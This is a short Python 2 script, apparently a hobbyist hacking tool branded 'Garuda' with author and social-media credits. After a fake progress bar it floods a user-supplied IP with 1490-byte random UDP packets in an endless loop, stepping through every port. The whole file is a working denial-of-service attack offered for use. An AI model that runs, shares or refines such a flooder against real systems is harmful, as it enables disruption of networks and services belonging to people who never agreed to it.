import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Banner Start
def print_banner_garuda():
    banner = """
      ________                       .___       
 /  _____/_____ _______ __ __  __| _/____   
/   \  ___\__  \\_  __ \  |  \/ __ |\__  \  
\    \_\  \/ __ \|  | \/  |  / /_/ | / __ \_
 \______  (____  /__|  |____/\____ |(____  /
        \/     \/                 \/     \/ 
    """
    print banner

if __name__ == "__main__":
    print_banner_garuda()

#Banner End
print "\033[1;40mAuthor    : kinghacker0\033[1;40m "
print "\033[1;40mGithub    : https://github.com/mrdarkx05\033[1;40m "
print "\033[1;40mInstagram : https://www.instagram.com/darkx.ic\033[1;40m"
print     
ip = raw_input("[*]Enter Target Ip : ")
port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)
print "[-------->           ] 45%"
time.sleep(3)
print "[------------>       ] 55%"
time.sleep(3)
print "[------------------->] 100%"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

